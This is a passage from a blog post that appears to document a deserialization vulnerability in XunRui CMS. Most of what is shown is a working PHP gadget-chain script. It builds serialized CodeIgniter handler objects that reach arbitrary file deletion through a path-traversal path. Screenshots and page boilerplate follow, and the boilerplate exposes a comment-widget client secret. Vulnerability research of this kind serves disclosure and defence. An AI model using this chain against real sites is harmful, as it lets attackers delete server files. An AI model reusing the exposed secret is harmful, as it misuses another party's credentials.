+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">CodeIgniter</span>\<span class="title class_">Cache</span>\<span class="title class_">Handlers</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileHandler</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$prefix</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$path</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;prefix = <span class="string">&quot;api&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;path = <span class="string">&quot;../../../../1/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">CodeIgniter</span>\<span class="title class_">Session</span>\<span class="title class_">Handlers</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MemcachedHandler</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$memcached</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lockKey</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;lockKey = <span class="string">&quot;.php&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;memcached = <span class="keyword">new</span> <span class="title class_">\CodeIgniter\Cache\Handlers\FileHandler</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">CodeIgniter</span>\<span class="title class_">Cache</span>\<span class="title class_">Handlers</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RedisHandler</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$redis</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;redis = <span class="keyword">new</span> <span class="title class_">\CodeIgniter\Session\Handlers\MemcachedHandler</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>((<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title class_">RedisHandler</span>())));</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230626161318185.png" alt="image-20230626161318185"></p>
+<p><img src="/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/image-20230626161302226.png" alt="image-20230626161302226"></p>
+
+  </div>
+</article>
+
+
+
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+    <script src="https://cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.min.js"></script>
+    <div id="gitalk-container"></div>
+    <script type="text/javascript">
+        var gitalk = new Gitalk({
+            clientID: '36d8630513c873eafed5',
+            clientSecret: '48ebe20e693552751cac17f33d1fbf5256018354',
+            id: md5(window.location.pathname),
+            repo: 'al-waf',
+            owner: 'wafinfo',
+            admin: 'wafinfo',
+            distractionFreeMode: ''
+        })
+        gitalk.render('gitalk-container')
+    </script>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/wafinfo">Projects</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E7%89%88%E6%9C%AC"><span class="toc-number">1.</span> <span class="toc-text">影响版本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%A7%A6%E5%8F%91%E7%82%B9"><span class="toc-number">3.1.</span> <span class="toc-text">反序列化触发点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%85%A5%E5%8F%A3%E7%82%B9"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞入口点</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#destruct%E5%88%A9%E7%94%A8%E5%9C%B0%E5%9D%801"><span class="toc-number">3.2.1.</span> <span class="toc-text">__destruct利用地址1:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#destruct%E5%88%A9%E7%94%A8%E5%9C%B0%E5%9D%802"><span class="toc-number">3.2.2.</span> <span class="toc-text">__destruct利用地址2:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#destruct%E5%88%A9%E7%94%A8%E5%9C%B0%E5%9D%803"><span class="toc-number">3.2.3.</span> <span class="toc-text">__destruct利用地址3:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#destruct%E5%88%A9%E7%94%A8%E5%9C%B0%E5%9D%804"><span class="toc-number">3.2.4.</span> <span class="toc-text">__destruct利用地址4:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E9%93%BE-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4"><span class="toc-number">3.3.</span> <span class="toc-text">利用链 任意文件删除</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/&text=记一次项目中迅睿CMS反序列化漏洞挖掘"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/&title=记一次项目中迅睿CMS反序列化漏洞挖掘"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/&is_video=false&description=记一次项目中迅睿CMS反序列化漏洞挖掘"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=记一次项目中迅睿CMS反序列化漏洞挖掘&body=Check out this article: https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/&title=记一次项目中迅睿CMS反序列化漏洞挖掘"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/&title=记一次项目中迅睿CMS反序列化漏洞挖掘"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/&title=记一次项目中迅睿CMS反序列化漏洞挖掘"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/&title=记一次项目中迅睿CMS反序列化漏洞挖掘"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/&name=记一次项目中迅睿CMS反序列化漏洞挖掘&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://github.com/2023/06/25/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E8%BF%85%E7%9D%BFCMS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/&t=记一次项目中迅睿CMS反序列化漏洞挖掘"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2023
+    Wafinfo&#39;s Blog
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="https://github.com/wafinfo">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
